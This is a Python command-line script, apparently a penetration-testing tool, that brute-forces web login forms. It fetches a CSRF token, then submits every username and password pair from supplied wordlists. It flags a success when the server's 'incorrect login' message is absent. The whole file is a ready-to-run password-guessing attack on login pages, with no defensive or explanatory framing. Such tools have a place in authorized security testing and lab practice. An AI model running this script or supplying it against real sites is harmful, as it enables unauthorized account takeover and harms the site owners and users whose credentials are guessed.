import requests
from bs4 import BeautifulSoup
import argparse

def get_csrf_token(session, url, field_name):
    response = session.get(url)
    soup = BeautifulSoup(response.content, 'html.parser')
    csrf_token = soup.find('input', {'name': field_name})['value']
    return csrf_token

def attempt_login(session, url, field_name, csrf_token, usernames, passwords, incorrect_response):
    for username in usernames:
        username = username.strip()

        for password in passwords:
            password = password.strip()

            data = {
                field_name: csrf_token,
                'username': username,
                'password': password,
                'Login': 'Login',  # Include the "Login" field in the form data
            }
            headers = {'Content-Type': 'application/x-www-form-urlencoded'}
            response = session.post(url, data=data, headers=headers)

            if response.status_code == 200:
                if incorrect_response not in response.text:
                    print(f"Successful login with username '{username}' and password '{password}' at {url}.")
                else:
                    print(f"Response text: {response.text}")
                    print(f"Session data: {session}")
                    print(f"Attempted login with username '{username}' and password '{password}' at {url}.")
            else:
                print(f"Failed to attempt login with username '{username}' and password '{password}' at {url} (Status code: {response.status_code}).")

def get_iterable_from_argument(value):
    if value.startswith('@'):
        return [value[1:]]  # Return a list containing the string without '@' prefix
    else:
        with open(value, 'r') as file:
            return file.readlines()

def main():
    # Set up the command line argument parser
    parser = argparse.ArgumentParser(description='Scrape a CSRF token from a web page and attempt logins with different username-password combinations.')
    parser.add_argument('-u', '--url', required=True, help='The URL of the web page to scrape and attempt logins.')
    parser.add_argument('-f', '--field_name', required=True, help='The name of the CSRF token field to retrieve.')
    parser.add_argument('--usernames', required=True, type=str, help='Path to the file with usernames or a single username (prefix with @).')
    parser.add_argument('--passwords', required=True, type=str, help='Path to the file with passwords or a single password (prefix with @).')
    parser.add_argument('-i', '--incorrect_response', required=True, help='A string that indicates an incorrect login attempt in the web server response.')

    # Parse the command line arguments
    args = parser.parse_args()

    # Create a session object to handle cookies
    session = requests.Session()

    # Call the function to get the CSRF token
    csrf_token = get_csrf_token(session, args.url, args.field_name)

    if csrf_token:
        print(f"CSRF Token Value: {csrf_token}")

        # Get the iterable for usernames and passwords
        usernames = get_iterable_from_argument(args.usernames)
        passwords = get_iterable_from_argument(args.passwords)

        # Attempt logins using the usernames and passwords
        attempt_login(session, args.url, args.field_name, csrf_token, usernames, passwords, args.incorrect_response)

if __name__ == '__main__':
    main()
